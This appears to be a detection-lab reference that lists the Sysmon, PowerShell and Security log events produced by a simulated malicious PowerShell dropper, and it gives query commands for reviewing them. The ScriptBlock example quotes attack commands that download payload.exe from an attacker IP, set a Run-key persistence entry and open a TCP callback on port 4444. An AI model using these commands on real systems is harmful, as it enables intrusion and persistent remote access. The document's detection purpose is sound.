# Scenario 2 — Expected Evidence

> This document describes the exact evidence generated by the simulated malicious file
> execution scenario and where to find it. Use this as a reference for building
> collectors, detection rules, and correlation logic.

## Evidence Summary

| # | Evidence Type | Source | Event ID | Count |
|---|---|---|---|---|
| 1 | PowerShell process creation | Sysmon | EID 1 | 1 |
| 2 | Network connection (HTTP download) | Sysmon | EID 3 | 1 |
| 3 | File creation (payload) | Sysmon | EID 11 | 1 |
| 4 | Payload process creation | Sysmon | EID 1 | 1 |
| 5 | Registry Run key modification | Sysmon | EID 13 | 1 |
| 6 | Network connection (callback) | Sysmon | EID 3 | 1 |
| 7 | PowerShell ScriptBlock log | PS Operational | EID 4104 | 1+ |
| 8 | Process creation audit | Security Log | EID 4688 | 2+ |

## 1. PowerShell Process Creation (Sysmon EID 1)

**Log**: `Microsoft-Windows-Sysmon/Operational`

### Example Event (XML)
```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{...}" />
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-10-21T14:23:01.000Z" />
    <Computer>aegis-windows</Computer>
  </System>
  <EventData>
    <Data Name="RuleName">technique_id=T1059.001</Data>
    <Data Name="UtcTime">2026-10-21 14:23:01.000</Data>
    <Data Name="ProcessId">4512</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -ExecutionPolicy Bypass -File C:\vagrant\attacks\scenario2-malicious-exec\payload-dropper.ps1</Data>
    <Data Name="User">AEGIS-WINDOWS\labuser</Data>
    <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
  </EventData>
</Event>
```

### Key Detection Fields
- `Image` contains `powershell.exe`
- `CommandLine` contains `-ExecutionPolicy Bypass`
- This is the parent process for the entire attack chain

## 2. Network Connection — HTTP Download (Sysmon EID 3)

### Example Event
```xml
<EventData>
  <Data Name="RuleName">technique_id=T1105</Data>
  <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
  <Data Name="User">AEGIS-WINDOWS\labuser</Data>
  <Data Name="Protocol">tcp</Data>
  <Data Name="SourceIp">10.10.10.30</Data>
  <Data Name="SourcePort">49789</Data>
  <Data Name="DestinationIp">10.10.10.10</Data>
  <Data Name="DestinationPort">8080</Data>
</EventData>
```

### Detection Pattern
- PowerShell making outbound HTTP connection to non-standard port
- Destination is the Kali attacker IP

## 3. File Creation — Payload Written (Sysmon EID 11)

### Example Event
```xml
<EventData>
  <Data Name="RuleName">technique_id=T1105</Data>
  <Data Name="UtcTime">2026-10-21 14:23:03.000</Data>
  <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>

</EventData>
```

### Detection Pattern
- Executable file (`.exe`) created in `C:\Users\Public\`
- Created by PowerShell (suspicious origin)

## 4. Payload Process Creation (Sysmon EID 1)

### Example Event
```xml
<EventData>
  <Data Name="Image">C:\Users\Public\payload.exe</Data>
  <Data Name="CommandLine">"C:\Users\Public\payload.exe"</Data>
  <Data Name="User">AEGIS-WINDOWS\labuser</Data>
  <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
  <Data Name="ParentCommandLine">powershell.exe -ExecutionPolicy Bypass -File ...</Data>
</EventData>
```

### Detection Pattern
- Process started from `C:\Users\Public\` (unusual execution location)
- Parent process is PowerShell

## 5. Registry Persistence (Sysmon EID 13)

### Example Event
```xml
<EventData>
  <Data Name="RuleName">technique_id=T1547.001</Data>
  <Data Name="EventType">SetValue</Data>
  <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
  <Data Name="TargetObject">HKU\S-1-5-21-...\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AegisRangeTest</Data>
  <Data Name="Details">C:\Users\Public\payload.exe</Data>
</EventData>
```

### Detection Pattern
- Registry key path contains `CurrentVersion\Run` (autostart persistence)
- Value points to executable in suspicious location

## 6. Network Connection — Callback (Sysmon EID 3)

### Example Event
```xml
<EventData>
  <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
  <Data Name="Protocol">tcp</Data>
  <Data Name="DestinationIp">10.10.10.10</Data>
  <Data Name="DestinationPort">4444</Data>
</EventData>
```

### Detection Pattern
- Outbound connection to port 4444 (commonly associated with reverse shells)
- Initiated by PowerShell

## 7. PowerShell ScriptBlock Logging (EID 4104)

**Log**: `Microsoft-Windows-PowerShell/Operational`

### Example Event
```
ScriptBlock ID: {guid}
ScriptBlock Text:
  Invoke-WebRequest -Uri "http://10.10.10.10:8080/payload.exe" -OutFile "C:\Users\Public\payload.exe"
  ...
  Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' ...
  ...
  New-Object System.Net.Sockets.TcpClient("10.10.10.10", 4444)
```

### Detection Pattern
- ScriptBlock contains URLs to internal IPs
- ScriptBlock contains `TcpClient` construction
- ScriptBlock modifies Run keys

## Timeline Pattern

```
T+0s    : PowerShell.exe starts with -ExecutionPolicy Bypass (Sysmon EID 1)
T+1s    : Outbound HTTP to 10.10.10.10:8080 (Sysmon EID 3)
T+2s    : payload.exe written to C:\Users\Public\ (Sysmon EID 11)
T+3s    : payload.exe process created, parent=powershell.exe (Sysmon EID 1)
T+5s    : payload.exe exits
T+7s    : Registry Run key "AegisRangeTest" set (Sysmon EID 13)
T+9s    : Outbound TCP to 10.10.10.10:4444 (Sysmon EID 3)
T+10s   : PowerShell script completes
```

This pattern — **script execution → download → file drop → execute → persist → callback** —
is the key signature for correlation. All events share the PowerShell PID as the
originating process, which links them together.

## Querying Events on Windows

```powershell
# View all Sysmon events from the last hour
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 |
    Where-Object { $_.TimeCreated -gt (Get-Date).AddHours(-1) } |
    Format-Table TimeCreated, Id, Message -Wrap

# View only process creation events
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 1 } | Select-Object -First 20

# View PowerShell ScriptBlock logs
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
    Where-Object { $_.Id -eq 4104 } | Select-Object -First 10
```
